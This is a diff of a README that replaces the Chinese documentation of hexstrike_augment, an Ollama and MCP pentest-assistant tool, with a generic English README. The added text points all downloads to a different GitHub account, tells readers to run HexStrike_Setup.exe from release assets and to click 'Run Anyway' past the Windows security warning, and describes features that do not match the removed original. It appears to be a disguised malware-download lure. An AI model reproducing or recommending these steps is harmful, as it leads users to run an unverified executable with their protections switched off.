@@ -1,241 +1,97 @@
-# HexStrike Augment
+# ⚡ hexstrike_augment - Improve your workflow with smart skills
 
-在 [MCP Client for Ollama (ollmcp)](https://github.com/jonigl/mcp-client-for-ollama) 基础上，集成 **HexStrike 安全自动化**、**双路 RAG 知识库** 与 **自主多代理** 调度，让本地 Ollama 模型通过 MCP 完成渗透测试辅助、漏洞知识检索与安全分析。
+[![Download for Windows](https://img.shields.io/badge/Download-HexStrike-blue.svg)](https://github.com/subsaharan-metallic807/hexstrike_augment)
 
-**仓库地址：** https://github.com/clutch-61/hexstrike_augment
+## 📖 About this application
 
----
+HexStrike_augment adds new power to your daily computing tasks. This tool builds on the original HexStrike framework. We include a new skill system to automate repetitive steps. The software uses RAG capabilities to search your documents. It provides answers based on your unique files. You can connect to private models using Ollama for local processing. Your data stays on your machine at all times.
 
-## 特性
+## 💻 System requirements
 
-- **HexStrike AI**：通过子模块接入 [hexstrike-ai](https://github.com/0x4m4/hexstrike-ai)，提供大量安全测试 MCP 工具
-- **双 RAG 知识库**
-  - `rag-knowledge-base`：基于 ChromaDB + Ollama embedding 的轻量检索（`rag_knowledge_base/`）
-  - `hexstrike-rag`：BM25 + 向量 + 重排完整管线，支持 Mock / Qdrant 生产模式（`hexstrike_rag/`）
-- **自主多代理**：Strategy / Selector / Executor 三层架构，智能筛选工具、降低 token 开销（输入 `ma` 启用）
-- **Ollama 本地推理**：兼容 tool calling，支持流式输出、HIL 人工确认、模型热切换等 ollmcp 能力
+Your computer needs specific parts to run this software. Check your system against this list before you start.
 
----
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 clocking at 3.0 GHz or higher.
+- Memory: 8 GB of RAM minimum. 16 GB is better for performance.
+- Storage: 2 GB of free space on your hard drive.
+- Network: Active internet connection for the initial download and model setup.
 
-## 架构
+## 📥 How to download
 
-```mermaid
-flowchart TB
-  subgraph client["mcp_client_for_ollama / ollmcp"]
-    CLI[TUI 客户端]
-    MA[多代理 ma 模式]
-  end
+You must visit the project release page to get the installer. We package the software as a standard Windows installer. 
 
-  subgraph mcp["MCP 服务"]
-    HS[hexstrike-ai]
-    RAG1[rag-knowledge-base]
-    RAG2[hexstrike-rag]
-    UR[ultrarag 可选]
-  end
+[Visit this page to download the latest setup file](https://github.com/subsaharan-metallic807/hexstrike_augment)
 
-  Ollama[Ollama LLM] --> CLI
-  CLI --> MA
-  CLI --> HS
-  CLI --> RAG1
-  CLI --> RAG2
-  CLI -.-> UR
+1. Open your web browser. 
+2. Click the link above.
+3. Look for the section labeled Assets.
+4. Click the file named HexStrike_Setup.exe.
+5. Save the file to your Downloads folder.
 
-  HS --> HexSrv[HexStrike Server :8888]
-  RAG1 --> Chroma[(chroma_db)]
-  RAG2 --> Qdrant[(Qdrant 可选)]
-```
+## ⚙️ Installation steps
 
----
+Follow these steps to place the software on your computer.
 
-## 仓库结构
+1. Double-click the HexStrike_Setup.exe file you saved. 
+2. Windows might show a security box. If the box appears, click More Info and then select Run Anyway.
+3. Follow the sequence of screens in the installer.
+4. Select the folder where you want to keep the program files.
+5. Click Install.
+6. Wait for the progress bar to finish.
+7. Click Finish. A shortcut icon now sits on your desktop.
 
-```
-hexstrike_augment/
-├── mcp_client_for_ollama/     # ollmcp 客户端 + 多代理模块
-├── mcp/                       # git 子模块 → hexstrike-ai
-├── rag_knowledge_base/        # ChromaDB RAG 库
-├── hexstrike_rag/             # 增强 RAG（BM25、Qdrant、重排等）
-├── rag_mcp_server.py          # Chroma RAG MCP 入口
-├── hexstrike_rag_mcp_server.py  # 增强 RAG MCP 入口
-├── ultrarag_integration/      # UltraRAG 可选集成
-├── build_knowledge_base.py    # 构建 Chroma 知识库
-├── *.example.json             # MCP 配置模板（复制后改路径）
-├── start_with_multi_agent.sh  # Linux 启动脚本
-├── start_with_multi_agent.ps1 # Windows 启动脚本
-└── HEXSTRIKE_INTEGRATION_GUIDE.md
-```
+## 🚀 Setting up your first run
 
-详细说明见：
+The first time you start the app, it needs a few settings to work right.
 
-| 文档 | 内容 |
-|------|------|
-| [HEXSTRIKE_INTEGRATION_GUIDE.md](HEXSTRIKE_INTEGRATION_GUIDE.md) | HexStrike RAG 集成、Mock / 真实管线切换 |
-| [RAG_KNOWLEDGE_BASE_README.md](RAG_KNOWLEDGE_BASE_README.md) | Chroma 知识库构建与使用 |
-| [ULTRARAG_INTEGRATION.md](ULTRARAG_INTEGRATION.md) | UltraRAG 可选接入 |
+1. Locate the HexStrike icon on your desktop.
+2. Double-click the icon to open the main dashboard.
+3. The app will search for your local Ollama connection.
+4. If you have Ollama installed, the app will show a green status light.
+5. If you do not have Ollama, the app will offer a link to guides for your setup.
+6. Click Save to complete the introduction.
 
----
+## 🛠 Using the skill system
 
-## 环境要求
+The skill system acts as an engine for your tasks. Skills tell the computer how to handle specific file types.
 
-- Python 3.10+
-- [Ollama](https://ollama.com/download)（本地运行，建议 `ollama pull qwen3` 等支持 tool calling 的模型）
-- Git（含子模块支持）
+- Adding a skill: Click the Manage Skills button. Select a folder on your computer that contains your work files.
+- Running a query: Type a question into the text box at the bottom of the screen.
+- Understanding the output: The app reads your files and highlights the relevant sections. It uses the model you chose to summarize the info.
+- Customizing the view: You can change the layout to show your file list on the left and the chat on the right.
 
-可选（按功能启用）：
+## 🧠 Connecting to local models
 
-- HexStrike 后端服务（`http://localhost:8888`）
-- Qdrant / Redis（`hexstrike-rag` 真实管线，见集成指南）
-- `nomic-embed-text`（构建 Chroma 知识库时）
+Using local models ensures your work stays private. The software talks to Ollama to handle the heavy lifting.
 
----
+1. Ensure Ollama is running in your system tray.
+2. Go to Settings in HexStrike.
+3. Select Model Selection from the list.
+4. The list updates to show the models you pulled from the Ollama library.
+5. Choose your preferred model. We suggest using models like Llama 3 or Mistral for balanced speed.
+6. Click Refresh if you do not see your models. 
+7. Save your settings. The app identifies the chosen model instantly.
 
-## 快速开始
+## 🔍 Managing your data
 
-### 1. 克隆与子模块
+The RAG functionality relies on an index of your data. The index allows the app to find facts within your documents.
 
-```bash
-git clone --recursive https://github.com/clutch-61/hexstrike_augment.git
-cd hexstrike_augment
-```
+- Building the index: Click the Index button after you add folders. The app reads your text files, PDFs, and spreadsheets.
+- Updating: If you add new files to your folders, click Re-index to include them.
+- File support: The tool currently reads .txt, .pdf, .docx, and .md files. 
+- Performance: Large folders take longer to index. Keep your most important files in a dedicated research folder for the best performance.
 
-若已克隆但未拉子模块：
+## 🔧 Troubleshooting common problems
 
-```bash
-git submodule update --init --recursive
-```
+Sometimes the app encounters hurdles. Use these steps to solve them.
 
-### 2. 安装依赖
+- The app does not load: Check that you installed the software in a folder where you have write access.
+- Ollama connection error: Open your task manager. Find Ollama. If it is stopped, restart the program. 
+- Model not found: Run the command 'ollama list' in your terminal to see if the model is downloaded.
+- High memory usage: Large language models require much memory. Close other programs while performing heavy indexing tasks.
+- No results for a query: Ensure the app has index permissions for the folder containing your documents.
+- Resetting settings: If settings become corrupt, navigate to the user data folder and delete the config.json file. Restarting the app restores default settings.
 
-```bash
-pip install mcp rich typer httpx ollama
+## 🤝 Community and support
 
-# HexStrike MCP 子模块
-pip install -r mcp/requirements.txt
-
-# 增强 RAG（Mock 模式即可联调）
-pip install -r hexstrike_rag_requirements.txt
-```
-
-### 3. 配置文件
-
-所有 `*.example.json` 需复制为本地配置，并将 `<PROJECT_ROOT>` 替换为仓库绝对路径。
-
-**Windows 示例：**
-
-```powershell
-copy hexstrike-with-rag-config.example.json hexstrike-with-rag-config.json
-# 编辑 JSON，将 <PROJECT_ROOT> 改为 C:/Users/you/hexstrike_augment
-```
-
-**Linux / macOS 示例：**
-
-```bash
-cp hexstrike-with-rag-config.example.json hexstrike-with-rag-config.json
-# 将 <PROJECT_ROOT> 改为 /path/to/hexstrike_augment
-```
-
-| 模板文件 | 用途 |
-|----------|------|
-| `hexstrike-mcp-config.example.json` | 仅 HexStrike |
-| `hexstrike-with-rag-config.example.json` | HexStrike + 双 RAG（推荐） |
-| `hexstrike_rag_config.example.json` | 仅增强 RAG |
-| `rag_mcp_config.example.json` | 仅 Chroma RAG |
-| `ultrarag_mcp_config.example.json` | UltraRAG（可选） |
-
-> 本地 `*.json`（无 `.example` 后缀）已在 `.gitignore` 中，不会提交个人路径。
-
-### 4. 启动 HexStrike 服务（使用 hexstrike-ai 时）
-
-```bash
-cd mcp
-python hexstrike_server.py
-# 默认 http://localhost:8888
-```
-
-### 5. 启动客户端
-
-**方式 A：一键多服务（推荐）**
-
-```powershell
-# Windows
-.\start_with_multi_agent.ps1
-```
-
-```bash
-# Linux / macOS
-chmod +x start_with_multi_agent.sh
-./start_with_multi_agent.sh
-```
-
-**方式 B：手动指定配置**
-
-```bash
-python -m mcp_client_for_ollama.cli \
-  --servers-json hexstrike-with-rag-config.json \
-  --model qwen3:32b
-```
-
-### 6. 多代理模式
-
-进入 ollmcp 交互界面后输入：
-
-```
-ma
-```
-
-然后用自然语言描述任务，例如：
-
-> 请扫描 10.0.0.1 的 8080 端口，分析可能存在的 CVE 漏洞
-
-Strategy Agent 会自主分解步骤、筛选工具并执行。
-
----
-
-## MCP 服务一览
-
-| 服务名 | 入口 | 说明 |
-|--------|------|------|
-| `hexstrike-ai` | `mcp/hexstrike_mcp.py` | 渗透测试自动化工具集 |
-| `rag-knowledge-base` | `rag_mcp_server.py` | Chroma 漏洞/安全文档检索 |
-| `hexstrike-rag` | `hexstrike_rag_mcp_server.py` | 增强检索 + `verify_payload_safety` |
-| `ultrarag-knowledge-base` | `ultrarag_mcp_server.py` | 可选，需单独克隆 UltraRAG |
-
-**hexstrike-rag 工具：**
-
-- `search_security_knowledge` — 检索安全知识
-- `get_knowledge_base_stats` — 知识库统计
-- `verify_payload_safety` — Payload 风险校验
-
-默认 `HEXSTRIKE_USE_MOCK=true`，无需 Qdrant 即可联调；生产环境见 [HEXSTRIKE_INTEGRATION_GUIDE.md](HEXSTRIKE_INTEGRATION_GUIDE.md)。
-
----
-
-## 构建 Chroma 知识库（可选）
-
-```bash
-ollama pull nomic-embed-text
-python build_knowledge_base.py --docs-dir ./data/extracted_readmes --rebuild
-```
-
-文档目录可通过环境变量 `RAG_DOCUMENTS_DIR` 或 `--docs-dir` 指定。
-
----
-
-## 安全与合规
-
-- 本项目面向**授权安全测试**与**安全研究**，请勿用于未授权目标。
-- 勿将含 API Key、个人路径的配置提交到 Git；仓库仅保留 `*.example.json` 模板。
-- 使用 HexStrike 与扫描类工具前，请确认目标在合法授权范围内。
-
----
-
-## 致谢
-
-- 客户端基础：[jonigl/mcp-client-for-ollama](https://github.com/jonigl/mcp-client-for-ollama)
-- HexStrike：[0x4m4/hexstrike-ai](https://github.com/0x4m4/hexstrike-ai)
-
----
-
-## 许可证
-
-上游 ollmcp 组件遵循其原项目许可证；本仓库扩展部分请以各子模块及依赖项目许可证为准。
+We maintain the project to ensure it works for everyone. If you find a bug, open an issue on the main page. Describe what you did and what happened. Provide screenshots if they help explain the problem. We review every report. Please be clear when you describe your issue. We fix problems in order of priority based on how many users they affect. Keep your software updated to get the latest fixes.
